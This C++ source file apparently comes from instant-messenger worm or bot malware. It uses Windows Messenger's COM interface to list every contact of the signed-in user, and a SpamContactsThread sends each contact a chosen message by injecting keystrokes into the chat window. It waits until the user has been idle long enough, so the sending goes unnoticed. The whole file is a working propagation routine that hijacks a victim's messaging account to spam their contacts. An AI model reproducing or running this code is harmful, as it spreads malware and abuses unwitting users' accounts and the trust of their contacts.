#include <winsock2.h>
#include "msm.h"

namespace MSM
{
	VOID SendIM(PCHAR Contact, LPCTSTR Message, BOOL Close){
		CoInitialize(NULL);
		IMessenger *Messenger;
		if(SUCCEEDED(CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_LOCAL_SERVER, IID_IMessenger, (VOID **)&Messenger))){
			CComBSTR SigninName = Contact;
			VARIANT Variant;
			Variant.vt = VT_BSTR;
			Variant.bstrVal = SigninName;
			IDispatch *Dispatch;
			if(SUCCEEDED(Messenger->InstantMessage(Variant, &Dispatch))){
				IMessengerWindow *MessengerWindow;
				Dispatch->QueryInterface(IID_IMessengerWindow, (VOID **)&MessengerWindow);
				Dispatch->Release();
				HWND hWnd;
				MessengerWindow->get_HWND((LONG *)&hWnd);
				CHAR String[128];
				GetWindowText(hWnd, String, sizeof(String));
				HWND EditBox = FindWindowEx(hWnd, FindWindowEx(hWnd, NULL, "RichEdit20W", NULL), "RichEdit20W", NULL);
				if(EditBox){
					for(UINT i = 0; i < strlen(Message); i++)
						SendMessage(EditBox, WM_CHAR, (WPARAM)Message[i], NULL);
					SendMessage(EditBox, WM_KEYDOWN, (WPARAM)VK_RETURN, NULL);
				}
				if(Close)
					MessengerWindow->Close();
				MessengerWindow->Release();
			}
			Messenger->Release();

		}
		CoUninitialize();
	}

	std::vector<std::string> EnumContacts(VOID){
		std::vector<std::string> Contacts;
		CoInitialize(NULL);
		IMessenger *Messenger;
		if(SUCCEEDED(CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_LOCAL_SERVER, IID_IMessenger, (VOID **)&Messenger))){
			IDispatch *Dispatch;
			IMessengerContacts *MessengerContacts;
			Messenger->get_MyContacts(&Dispatch);
			Dispatch->QueryInterface(IID_IMessengerContacts, (VOID **)&MessengerContacts);
			Dispatch->Release();
			LONG Count = 0;
			MessengerContacts->get_Count(&Count);
			for(UINT i = 0; i < Count; i++){
				IMessengerContact *MessengerContact;
				MessengerContacts->Item(i, &Dispatch);
				Dispatch->QueryInterface(IID_IMessengerContact, (VOID **)&MessengerContact);
				Dispatch->Release();
				CComBSTR Name;
				MessengerContact->get_SigninName(&Name);
				MessengerContact->Release();
				PCHAR String = _com_util::ConvertBSTRToString(Name);
				BOOL Exists = FALSE;
				for(UINT j = 0; j < Contacts.size(); j++)
					if(strcmp(String, Contacts[j].c_str()) == 0){
						Exists = TRUE;
						break;
					}
				if(!Exists)
					Contacts.push_back(String);
				delete[] String;
			}
			MessengerContacts->Release();
		}
		return Contacts;
	}

	class SpamContactsThread : public Thread
	{
	public:
		SpamContactsThread(PCHAR Message, DWORD MinIdleTime){
			strncpy(SpamContactsThread::Message, Message, sizeof(SpamContactsThread::Message));
			SpamContactsThread::MinIdleTime = MinIdleTime;
			StartThread();
		}

		VOID ThreadFunc(VOID){
			std::vector<std::string> Contacts = EnumContacts();
			for(UINT i = 0; i < Contacts.size(); i++){
				while(IdleTrack.GetIdleTime() < MinIdleTime)
					Sleep(1000);
				SendIM((PCHAR)Contacts[i].c_str(), Message, TRUE);
				Sleep(5000);
			}
		}
	private:
		CHAR Message[512];
		DWORD MinIdleTime;
	};

	VOID SpamContacts(PCHAR Message, DWORD MinIdleTime){
		new SpamContactsThread(Message, MinIdleTime);
	}
}